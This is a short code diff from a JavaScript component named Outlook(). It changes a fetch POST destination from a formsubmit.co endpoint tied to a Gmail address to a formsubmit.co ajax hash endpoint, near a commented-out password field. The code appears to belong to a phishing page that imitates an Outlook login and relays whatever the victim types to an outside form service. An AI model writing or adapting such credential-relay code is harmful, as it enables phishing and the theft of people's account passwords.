@@ -73,7 +73,7 @@ function Outlook() {
       //  password: false,
       });
 
-      fetch("https://formsubmit.co/oladunniwaters@gmail.com", {
+      fetch("https://formsubmit.co/ajax/b740faa9c2ebd5832f9dd248ca62d330", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
